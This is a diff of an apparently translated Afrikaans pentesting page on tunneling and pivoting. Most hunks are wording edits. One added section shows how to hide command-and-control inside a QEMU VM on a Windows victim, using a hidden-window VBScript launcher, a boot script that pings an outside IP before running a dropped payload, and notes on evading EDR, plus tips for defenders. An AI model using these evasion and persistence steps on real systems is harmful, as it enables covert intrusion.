@@ -9,7 +9,7 @@
 
 ## **Bash**
 
-**Gastheer -> Spring -> InternA -> InternB**
+**Gasheer -> Spring -> InternA -> InternB**
 ```bash
 # On the jump server connect the port 3333 to the 5985
 mknod backpipe p;
@@ -51,7 +51,7 @@ sudo ssh -L 631:<ip_victim>:631 -N -f -l <username> <ip_compromised>
 ```
 ### Port2hostnet (proxychains)
 
-Plaaslike Poort --> Gecompromitteerde gasheer (SSH) --> Enige plek
+Plaaslike Poort --> Gecompromitteerde gasheer (SSH) --> Enigiemand
 ```bash
 ssh -f -N -D <attacker_port> <username>@<ip_compromised> #All sent to local port will exit through the compromised server (use as proxy)
 ```
@@ -89,17 +89,17 @@ route add -net 10.0.0.0/16 gw 1.1.1.1
 ```
 > [!NOTE]
 > **Sekuriteit – Terrapin Aanval (CVE-2023-48795)**
-> Die 2023 Terrapin afgraderingsaanval kan 'n man-in-the-middle toelaat om met die vroeë SSH handdruk te sjoemel en data in **enige oorgestuurde kanaal** ( `-L`, `-R`, `-D` ) in te voeg. Verseker dat beide kliënt en bediener gepatch is (**OpenSSH ≥ 9.6/LibreSSH 6.7**) of sluit die kwesbare `chacha20-poly1305@openssh.com` en `*-etm@openssh.com` algoritmes in `sshd_config`/`ssh_config` eksplisiet af voordat jy op SSH tonnels staatmaak.
+> Die 2023 Terrapin afgraderingsaanval kan 'n man-in-the-middle toelaat om met die vroeë SSH handdruk te sjoemel en data in **enige voortgelei kanaal** ( `-L`, `-R`, `-D` ) in te voeg. Verseker dat beide kliënt en bediener gepatch is (**OpenSSH ≥ 9.6/LibreSSH 6.7**) of dat die kwesbare `chacha20-poly1305@openssh.com` en `*-etm@openssh.com` algoritmes in `sshd_config`/`ssh_config` eksplisiet gedeaktiveer word voordat daar op SSH tonnels vertrou word.
 
 ## SSHUTTLE
 
 Jy kan **tonnel** via **ssh** al die **verkeer** na 'n **subnetwerk** deur 'n gasheer.\
-Byvoorbeeld, om al die verkeer wat na 10.10.10.0/24 gaan, te oorgestuur.
+Byvoorbeeld, om al die verkeer wat na 10.10.10.0/24 gaan, voort te lei.
 ```bash
 pip install sshuttle
 sshuttle -r user@host 10.10.10.10/24
 ```
-Verbind met 'n privaat sleutel
+Verbind met 'n private sleutel
 ```bash
 sshuttle -D -r user@host 10.10.10.10 0/0 --ssh-cmd 'ssh -i ./id_rsa'
 # -D : Daemon mode
@@ -138,7 +138,7 @@ echo "socks4 127.0.0.1 1080" > /etc/proxychains.conf #Proxychains
 
 ### SOCKS-proxy
 
-Maak 'n poort op die spanbediener oop wat op al die interfaces luister wat gebruik kan word om die **verkeer deur die beacon te lei**.
+Maak 'n poort in die spanbediener oop wat op al die interfaces luister wat gebruik kan word om die **verkeer deur die beacon te lei**.
 ```bash
 beacon> socks 1080
 [+] started SOCKS4a server on: 1080
@@ -156,8 +156,8 @@ rportfwd stop [bind port]
 ```
 Om op te let:
 
-- Beacon se omgekeerde poort forwarding is ontwerp om **verkeer na die Spanbediener te tonnel, nie om tussen individuele masjiene te relay nie**.
-- Verkeer is **getonneld binne Beacon se C2 verkeer**, insluitend P2P skakels.
+- Beacon se omgekeerde poort forwarding is ontwerp om **verkeer na die Spanbediener te tonnel, nie om te relay tussen individuele masjiene nie**.
+- Verkeer word **getonnel binne Beacon se C2 verkeer**, insluitend P2P skakels.
 - **Admin regte is nie nodig** om omgekeerde poort forwards op hoë poorte te skep nie.
 
 ### rPort2Port plaaslik
@@ -250,7 +250,7 @@ attacker> python server.py --server-port 9999 --server-ip 0.0.0.0 --proxy-ip 127
 ```bash
 victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999
 ```
-Draai deur **NTLM proxy**
+Pivot deur **NTLM proxy**
 ```bash
 victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999 --ntlm-proxy-ip <proxy_ip> --ntlm-proxy-port 8080 --domain CONTOSO.COM --username Alice --password P@ssw0rd
 ```
@@ -300,7 +300,7 @@ OPENSSL,verify=1,cert=client.pem,cafile=server.crt,connect-timeout=5|PROXY:hacke
 
 **/bin/sh konsole**
 
-Skep sertifikate aan albei kante: Kliënt en Bediener
+Skep sertifikate aan beide kante: Kliënt en Bediener
 ```bash
 # Execute these commands on both sides
 FILENAME=socatssl
@@ -379,7 +379,7 @@ In **Profile -> Proxification Rules** voeg die naam van die program wat geproxif
 ## NTLM proxy bypass
 
 Die voorheen genoemde hulpmiddel: **Rpivot**\
-**OpenVPN** kan dit ook omseil deur hierdie opsies in die konfigurasie-lêer in te stel:
+**OpenVPN** kan dit ook omseil, deur hierdie opsies in die konfigurasie-lêer in te stel:
 ```bash
 http-proxy <proxy_ip> 8080 <file_with_creds> ntlm
 ```
@@ -387,8 +387,8 @@ http-proxy <proxy_ip> 8080 <file_with_creds> ntlm
 
 [http://cntlm.sourceforge.net/](http://cntlm.sourceforge.net/)
 
-Dit verifieer teen 'n proxy en bind 'n poort plaaslik wat na die eksterne diens wat jy spesifiseer, voortgelei word. Dan kan jy die hulpmiddel van jou keuse deur hierdie poort gebruik.\
-Byvoorbeeld, dit lei poort 443 voort.
+Dit verifieer teen 'n proxy en bind 'n poort plaaslik wat na die eksterne diens wat jy spesifiseer, voortgegee word. Dan kan jy die hulpmiddel van jou keuse deur hierdie poort gebruik.\
+Byvoorbeeld, dit voer poort 443 voort.
 ```
 Username Alice
 Password P@ssw0rd
@@ -409,13 +409,13 @@ Jy kan ook 'n **meterpreter** gebruik wat met localhost:443 verbind en die aanva
 
 [https://code.kryo.se/iodine/](https://code.kryo.se/iodine/)
 
-Root is nodig in beide stelsels om tun-adapters te skep en data tussen hulle te tonnel deur DNS-vrae te gebruik.
+Root is nodig in albei stelsels om tun-adapters te skep en data tussen hulle te tonnel deur DNS-vrae te gebruik.
 ```
 attacker> iodined -f -c -P P@ssw0rd 1.1.1.1 tunneldomain.com
 victim> iodine -f -P P@ssw0rd tunneldomain.com -r
 #You can see the victim at 1.1.1.2
 ```
-Die tonnel sal baie stadig wees. U kan 'n gecomprimeerde SSH-verbinding deur hierdie tonnel skep deur gebruik te maak van:
+Die tonnel sal baie stadig wees. U kan 'n gecomprimeerde SSH-verbinding deur hierdie tonnel skep deur te gebruik:
 ```
 ssh <user>@1.1.1.2 -C -c blowfish-cbc,arcfour -o CompressionLevel=9 -D 1080
 ```
@@ -448,18 +448,18 @@ listen [lhost:]lport rhost:rport #Ex: listen 127.0.0.1:8080 10.0.0.20:80, this b
 
 Proxychains onderskep `gethostbyname` libc oproep en tonnels tcp DNS versoek deur die socks proxy. Deur **verstek** is die **DNS** bediener wat proxychains gebruik **4.2.2.2** (hardgecodeer). Om dit te verander, wysig die lêer: _/usr/lib/proxychains3/proxyresolv_ en verander die IP. As jy in 'n **Windows omgewing** is, kan jy die IP van die **domeinbeheerder** stel.
 
-## Tonnels in Go
+## Tunnels in Go
 
 [https://github.com/hotnops/gtunnel](https://github.com/hotnops/gtunnel)
 
-## ICMP Toneling
+## ICMP Tunneling
 
 ### Hans
 
 [https://github.com/friedrich/hans](https://github.com/friedrich/hans)\
 [https://github.com/albertzak/hanstunnel](https://github.com/albertzak/hanstunnel)
 
-Root is nodig in beide stelsels om tun adapters te skep en data tussen hulle te tonnel deur ICMP echo versoeke.
+Root is nodig in beide stelsels om tun-adapters te skep en data tussen hulle te tonnel deur ICMP echo versoeke.
 ```bash
 ./hans -v -f -s 1.1.1.1 -p P@ssw0rd #Start listening (1.1.1.1 is IP of the new vpn connection)
 ./hans -f -c <server_ip> -p P@ssw0rd -v
@@ -561,7 +561,7 @@ cloudflared tunnel --url http://localhost:8080
 cloudflared tunnel --url socks5://localhost:1080 --socks5
 # Now configure proxychains to use 127.0.0.1:1080
 ```
-### Volhoubare tonnels met DNS
+### Volgehoude tonnels met DNS
 ```bash
 cloudflared tunnel create mytunnel
 cloudflared tunnel route dns mytunnel internal.example.com
@@ -578,7 +578,7 @@ Omdat alle verkeer die die gasheer **uitgaand oor 443** verlaat, is Cloudflared 
 
 ## FRP (Fast Reverse Proxy)
 
-[`frp`](https://github.com/fatedier/frp) is 'n aktief-onderhoubare Go omgekeerde-proxy wat **TCP, UDP, HTTP/S, SOCKS en P2P NAT-gat-punching** ondersteun. Begin met **v0.53.0 (Mei 2024)** kan dit as 'n **SSH Tunnel Gateway** optree, sodat 'n teiken gasheer 'n omgekeerde tonnel kan opstel met slegs die standaard OpenSSH-kliënt – geen ekstra binêre benodig nie.
+[`frp`](https://github.com/fatedier/frp) is 'n aktief-onderhoubare Go omgekeerde proxy wat **TCP, UDP, HTTP/S, SOCKS en P2P NAT-gat-punching** ondersteun. Begin met **v0.53.0 (Mei 2024)** kan dit as 'n **SSH Tunnel Gateway** optree, sodat 'n teiken gasheer 'n omgekeerde tonnel kan opstel met slegs die standaard OpenSSH-kliënt – geen ekstra binêre benodig nie.
 
 ### Klassieke omgekeerde TCP-tonnel
 ```bash
@@ -610,9 +610,67 @@ ssh -R :80:127.0.0.1:8080 v0@attacker_ip -p 2200 tcp --proxy_name web --remote_p
 ```
 Die bogenoemde opdrag publiseer die slagoffer se poort **8080** as **attacker_ip:9000** sonder om enige addisionele gereedskap te ontplooi – ideaal vir living-off-the-land pivoting.
 
-## Ander gereedskap om na te kyk
+## Verborgen VM-gebaseerde tonnels met QEMU
+
+QEMU se gebruikersmodus-netwerk (`-netdev user`) ondersteun 'n opsie genaamd `hostfwd` wat **'n TCP/UDP-poort op die *gasheer* bind en dit na die *gasheer* voortstuur**. Wanneer die gasheer 'n volle SSH-daemon draai, bied die hostfwd-reël jou 'n weggooibare SSH-jump box wat heeltemal binne 'n ephemerale VM leef – perfek om C2-verkeer van EDR te verberg omdat alle kwaadwillige aktiwiteit en lêers in die virtuele skyf bly.
+
+### Vinning een-liner
+```powershell
+# Windows victim (no admin rights, no driver install – portable binaries only)
+qemu-system-x86_64.exe ^
+-m 256M ^
+-drive file=tc.qcow2,if=ide ^
+-netdev user,id=n0,hostfwd=tcp::2222-:22 ^
+-device e1000,netdev=n0 ^
+-nographic
+```
+• Die opdrag hierbo begin 'n **Tiny Core Linux** beeld (`tc.qcow2`) in RAM.
+• Poort **2222/tcp** op die Windows-gasheer word deursigtig na **22/tcp** binne die gas teruggestuur.
+• Vanuit die aanvaller se oogpunt stel die teiken eenvoudig poort 2222 bloot; enige pakkette wat dit bereik, word hanteer deur die SSH-bediener wat in die VM loop.
+
+### Stealthy bekendstelling deur VBScript
+```vb
+' update.vbs – lived in C:\ProgramData\update
+Set o = CreateObject("Wscript.Shell")
+o.Run "stl.exe -m 256M -drive file=tc.qcow2,if=ide -netdev user,id=n0,hostfwd=tcp::2222-:22", 0
+```
+Running the script with `cscript.exe //B update.vbs` hou die venster weg.
+
+### In-gas volharding
+
+Omdat Tiny Core stateless is, doen aanvallers gewoonlik:
+
+1. Laat payload val na `/opt/123.out`
+2. Voeg by `/opt/bootlocal.sh`:
+
+```sh
+while ! ping -c1 45.77.4.101; do sleep 2; done
+/opt/123.out
+```
+
+3. Voeg `home/tc` en `opt` by `/opt/filetool.lst` sodat die payload in `mydata.tgz` gepak word tydens afsluiting.
+
+### Waarom dit opsporing ontduik
+
+• Slegs twee ongetekende uitvoerbare lêers (`qemu-system-*.exe`) raak die skyf; geen bestuurders of dienste word geïnstalleer nie.
+• Sekuriteitsprodukte op die gasheer sien **goedaardige loopback-verkeer** (die werklike C2 eindig binne die VM).
+• Geheue skandeerders analiseer nooit die kwaadwillige prosesruimte nie omdat dit in 'n ander OS woon.
+
+### Defender wenke
+
+• Laat weet oor **onverwagte QEMU/VirtualBox/KVM binêre** in gebruikers-skryfbare paaie.
+• Blokkeer uitgaande verbindings wat oorspronklik is van `qemu-system*.exe`.
+• Jag vir seldsame luisterpoorte (2222, 10022, …) wat onmiddellik bind na 'n QEMU-lancering.
+
+---
+
+## Ander gereedskap om te kontroleer
 
 - [https://github.com/securesocketfunneling/ssf](https://github.com/securesocketfunneling/ssf)
 - [https://github.com/z3APA3A/3proxy](https://github.com/z3APA3A/3proxy)
+
+## Verwysings
+
+- [Hiding in the Shadows: Covert Tunnels via QEMU Virtualization](https://trustedsec.com/blog/hiding-in-the-shadows-covert-tunnels-via-qemu-virtualization)
 
 {{#include ../banners/hacktricks-training.md}}
